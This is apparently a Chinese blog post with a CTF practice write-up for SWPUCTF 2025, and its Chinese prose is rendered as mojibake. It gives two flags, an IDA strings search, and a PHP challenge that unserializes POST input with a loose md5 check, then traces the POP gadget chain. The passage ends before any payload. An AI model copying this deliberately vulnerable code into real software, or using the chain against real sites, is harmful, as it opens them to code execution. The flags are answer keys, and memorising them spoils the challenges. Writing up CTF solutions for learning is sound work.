<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2 | SereniusXçš„åšå®¢</title><meta name="author" content="SereniusX"><meta name="copyright" content="SereniusX"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="é¢˜ç›®æ¥æºï¼šNSSCTF ç»ƒä¹ æ—¶é—´ï¼š2026å¹´2æœˆ1æ—¥ ç»ƒä¹ æ•°é‡ï¼š5 ä¸Šç¯‡ï¼šCTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›1 â­ï¸ 03 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]ä¸€ç§å¾ˆæ–°çš„ç­¾åˆ°ğŸš©flagï¼šNSSCTF{Welcome_To_NSS_Reverse_Challenge!!} ğŸ’¡hintï¼šreverse  ğŸ”§toolï¼šida-pro ä¸‹è½½é™„ä»¶åç”¨ida-proæ‰“å¼€ï¼Œç¬¬ä¸€æ­¥ï¼Œæ‰“å¼€ï¼š Vie">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2">
<meta property="og:url" content="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/index.html">
<meta property="og:site_name" content="SereniusXçš„åšå®¢">
<meta property="og:description" content="é¢˜ç›®æ¥æºï¼šNSSCTF ç»ƒä¹ æ—¶é—´ï¼š2026å¹´2æœˆ1æ—¥ ç»ƒä¹ æ•°é‡ï¼š5 ä¸Šç¯‡ï¼šCTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›1 â­ï¸ 03 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]ä¸€ç§å¾ˆæ–°çš„ç­¾åˆ°ğŸš©flagï¼šNSSCTF{Welcome_To_NSS_Reverse_Challenge!!} ğŸ’¡hintï¼šreverse  ğŸ”§toolï¼šida-pro ä¸‹è½½é™„ä»¶åç”¨ida-proæ‰“å¼€ï¼Œç¬¬ä¸€æ­¥ï¼Œæ‰“å¼€ï¼š Vie">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sereniusx.github.io/img/avatar2.jpg">
<meta property="article:published_time" content="2026-02-01T03:47:37.000Z">
<meta property="article:modified_time" content="2026-02-02T09:20:55.909Z">
<meta property="article:author" content="SereniusX">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sereniusx.github.io/img/avatar2.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2",
  "url": "https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/",
  "image": "https://sereniusx.github.io/img/avatar2.jpg",
  "datePublished": "2026-02-01T03:47:37.000Z",
  "dateModified": "2026-02-02T09:20:55.909Z",
  "author": [
    {
      "@type": "Person",
      "name": "SereniusX",
      "url": "https://sereniusx.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon2.ico"><link rel="canonical" href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"æœªæ‰¾åˆ°ç¬¦åˆæ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}","hits_stats":"å…±æ‰¾åˆ° ${hits} ç¯‡æ–‡ç« "}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/shuoshuo.css"><link rel="stylesheet" href="/css/gpt-article.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/heatmap.css"><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> åšæ–‡</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> åˆ†ç±»</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> å½’æ¡£</span></a></li><li><a class="site-page child" href="/heatmap/"><i class="fa-fw fa fa-fire"></i><span> çƒ­åŠ›å›¾</span></a></li><li><a class="site-page child" href="/writer/"><i class="fa-fw fa fa-print"></i><span> ç¼–è¾‘å™¨</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> ç”Ÿæ´»</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuos/"><i class="fa-fw fa fa-heart"></i><span> è¯´è¯´</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> ç›¸å†Œ</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> ä¹¦å•</span></a></li><li><a class="site-page child" href="/useful/"><i class="fa-fw fas fa-tags"></i><span> å¸¸ç”¨</span></a></li><li><a class="site-page child" href="/achievements/"><i class="fa-fw fa fa-medal"></i><span> æˆå°±</span></a></li><li><a class="site-page child" href="/todo/"><i class="fa-fw fa fa-list-check"></i><span> å¾…åŠ</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/mylink/"><i class="fa-fw fa fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> ç•™è¨€æ¿</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äºç¬”è€…</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SereniusXçš„åšå®¢</span></a><a class="nav-page-title" href="/"><span class="site-name">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> åšæ–‡</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> åˆ†ç±»</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> å½’æ¡£</span></a></li><li><a class="site-page child" href="/heatmap/"><i class="fa-fw fa fa-fire"></i><span> çƒ­åŠ›å›¾</span></a></li><li><a class="site-page child" href="/writer/"><i class="fa-fw fa fa-print"></i><span> ç¼–è¾‘å™¨</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> ç”Ÿæ´»</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuos/"><i class="fa-fw fa fa-heart"></i><span> è¯´è¯´</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> ç›¸å†Œ</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> ä¹¦å•</span></a></li><li><a class="site-page child" href="/useful/"><i class="fa-fw fas fa-tags"></i><span> å¸¸ç”¨</span></a></li><li><a class="site-page child" href="/achievements/"><i class="fa-fw fa fa-medal"></i><span> æˆå°±</span></a></li><li><a class="site-page child" href="/todo/"><i class="fa-fw fa fa-list-check"></i><span> å¾…åŠ</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/mylink/"><i class="fa-fw fa fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> ç•™è¨€æ¿</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äºç¬”è€…</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2026-02-01T03:47:37.000Z" title="å‘è¡¨äº 2026-02-01 11:47:37">2026-02-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2026-02-02T09:20:55.909Z" title="æ›´æ–°äº 2026-02-02 17:20:55">2026-02-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><p><em>é¢˜ç›®æ¥æºï¼šNSSCTF</em></p>
<p><em>ç»ƒä¹ æ—¶é—´ï¼š2026å¹´2æœˆ1æ—¥</em></p>
<p><em>ç»ƒä¹ æ•°é‡ï¼š5</em></p>
<p>ä¸Šç¯‡ï¼š<a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›1</a></p>
<h2 id="â­ï¸-03-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-ä¸€ç§å¾ˆæ–°çš„ç­¾åˆ°"><a href="#â­ï¸-03-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-ä¸€ç§å¾ˆæ–°çš„ç­¾åˆ°" class="headerlink" title="â­ï¸ 03 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]ä¸€ç§å¾ˆæ–°çš„ç­¾åˆ°"></a>â­ï¸ 03 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]ä¸€ç§å¾ˆæ–°çš„ç­¾åˆ°</h2><p>ğŸš©flagï¼š<code>NSSCTF{Welcome_To_NSS_Reverse_Challenge!!}</code></p>
<p>ğŸ’¡hintï¼š<code>reverse</code> </p>
<p>ğŸ”§toolï¼š<code>ida-pro</code></p>
<p>ä¸‹è½½é™„ä»¶åç”¨ida-proæ‰“å¼€ï¼Œç¬¬ä¸€æ­¥ï¼Œæ‰“å¼€ï¼š</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">View</span> â†’ <span class="keyword">Open</span> subviews â†’ Strings</span><br></pre></td></tr></tbody></table></figure>
<p>ç„¶åæœç´¢<br>ç”¨ âŒ˜ + F æŸ¥æ‰¾å…³é”®å­— <code>NSSCTF</code> å¾—åˆ°flagã€‚</p>
<p><img src="https://a1.boltp.com/2026/02/01/697ed43c95581.png" alt="ida-proç•Œé¢"></p>
<hr>
<h2 id="â­ï¸-04-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-FIRST-MEETING"><a href="#â­ï¸-04-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-FIRST-MEETING" class="headerlink" title="â­ï¸ 04 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]FIRST MEETING"></a>â­ï¸ 04 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]FIRST MEETING</h2><p>ğŸš©flagï¼š<code>NSSCTF{af957930-79c2-4697-961b-fafb66b2041f}</code></p>
<p>ğŸ’¡hintï¼š<code>web</code> <code>PHP ååºåˆ—åŒ–æ¼æ´</code> <code>POP é“¾åˆ©ç”¨ï¼ˆProperty Oriented Programmingï¼‰</code></p>
<p>ğŸ”§toolï¼š<code>phpè¿è¡Œå·¥å…·/ç¯å¢ƒ</code></p>
<p>åŸé¢˜å¥‰ä¸Šï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WEB</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sauy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$creambread</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$sauy</span></span>) </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sauy = <span class="variable">$sauy</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"I know you are good at this!"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; sauy;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE</span> </span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$re1sen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$harukaze</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ysyy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$acc</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>{</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span> -&gt; harukaze) ||!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span> -&gt; ysyy)||(<span class="variable language_">$this</span> -&gt; harukaze === <span class="variable language_">$this</span> -&gt; ysyy)) {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"ä½ è¾“çš„ä»€ä¹ˆä¸œè¥¿?"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; harukaze) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; ysyy)) {</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;acc)();</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PWN</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c0trick</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;wings === <span class="string">'SHENG-YI'</span>){</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; c0trick -&gt; <span class="title function_ invoke__">MinatoNamikaze</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"NSS WELCOME YOU!!!"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"No wings,no fly!"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MISC</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cr4p</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; cr4p -&gt; png = <span class="string">'010'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRYPTO</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kyarihoshi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rocage</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dance</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiss</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable">$kyarihoshi</span> = <span class="variable language_">$this</span> -&gt; kyarihoshi;</span><br><span class="line">        <span class="variable">$rocage</span> = <span class="variable language_">$this</span> -&gt; rocage;</span><br><span class="line">        <span class="variable">$kiss</span> = <span class="variable language_">$this</span> -&gt; kiss;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; dance = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;last === <span class="variable language_">$this</span> -&gt; dance){</span><br><span class="line">            <span class="variable">$kiss</span> = <span class="keyword">new</span> <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">kyarihoshi</span>(<span class="variable">$this</span> -&gt; rocage);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"<span class="subst">$kiss</span>&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"æ­å–œï¼&lt;br&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"LAST DANCE!May be you can find the trick!"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="variable">$NSS</span> = <span class="variable">$_POST</span>[<span class="string">"NSS"</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$NSS</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>æ¼æ´ç‚¹ï¼š<code>unserialize</code>ä¼šæŠŠç”¨æˆ·è¾“å…¥è¿˜åŸä¸ºå¯¹è±¡æˆ–è€…æ•°ç»„ã€‚</p>
<p>å¯¹äºwebï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WEB</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sauy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sauy;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>å½“ unserialize() ç»“æŸã€è„šæœ¬ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶ï¼ŒWEB å¯¹è±¡ä¼šææ„ï¼Œè‡ªåŠ¨æ‰§è¡Œ __destruct()ã€‚<br>å®ƒåšäº†ä¸€ä¸ªå…³é”®åŠ¨ä½œï¼šecho $this-&gt;sauy;<br>å¦‚æœ $sauy æ˜¯å­—ç¬¦ä¸²ï¼šå°±æ‰“å°å­—ç¬¦ä¸²<br>å¦‚æœ $sauy æ˜¯å¯¹è±¡ï¼šPHP ä¼šå°è¯•æŠŠå¯¹è±¡è½¬æˆå­—ç¬¦ä¸² â†’ è§¦å‘ __toString()</p>
<p>è¿›å…¥pwnï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PWN</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c0trick</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;wings === <span class="string">'SHENG-YI'</span>){</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;c0trick-&gt;<span class="title function_ invoke__">MinatoNamikaze</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"NSS WELCOME YOU!!!"</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"No wings,no fly!"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>è¿™é‡Œä¸¤ä»¶äº‹ï¼š<br>è¦æ±‚ $wings === â€˜SHENG-YIâ€™ï¼ˆä¸¥æ ¼ç›¸ç­‰ï¼‰<br>â†’ é€¼ä½ åœ¨ payload é‡ŒæŠŠå±æ€§å¡«å¯¹<br>è°ƒç”¨ä¸€ä¸ªæ ¹æœ¬ä¸å­˜åœ¨çš„æ–¹æ³•ï¼š<br>$this-&gt;c0trick-&gt;MinatoNamikaze();<br>å¯¹ä¸€ä¸ªå¯¹è±¡è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œä¼šè§¦å‘è¯¥å¯¹è±¡çš„ __call($name,$args)</p>
<p>ç„¶åä¼šè·³åˆ°reverseï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$harukaze</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ysyy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$acc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;harukaze) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;ysyy) || (<span class="variable language_">$this</span>-&gt;harukaze === <span class="variable language_">$this</span>-&gt;ysyy)) {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ä½ è¾“çš„ä»€ä¹ˆä¸œè¥¿?"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;harukaze) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ysyy)) {</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;acc)();</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
